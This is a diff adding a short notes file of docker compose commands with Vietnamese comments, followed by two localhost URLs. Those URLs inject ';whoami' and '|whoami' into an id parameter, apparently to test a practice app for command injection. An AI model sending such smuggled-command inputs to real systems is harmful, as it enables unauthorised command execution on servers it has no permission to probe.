@@ -1,0 +1,16 @@
+docker compose ps        # xem container đang chạy
+docker compose logs      # xem log
+docker compose logs -f   # xem log realtime
+docker compose down      # dừng & xoá container
+docker compose down -v   # dừng & xoá container và volume
+docker compose down -v --rmi all // tất cả mọi thứ
+                       --rmi local // dùng & xóa container và volume + xóa image ở local
+docker compose restart   # restart service
+docker compose up        # mở container
+docker compose up -d     # mở container và chạy ngầm
+docker compose up --build # build lại image và chạy container
+docker compose stop      # dừng container
+
+http://localhost:4000/snippet/backup?id=1%3Bwhoami ;
+http://localhost:4000/snippet/backup?id=1%7Cwhoami |
+
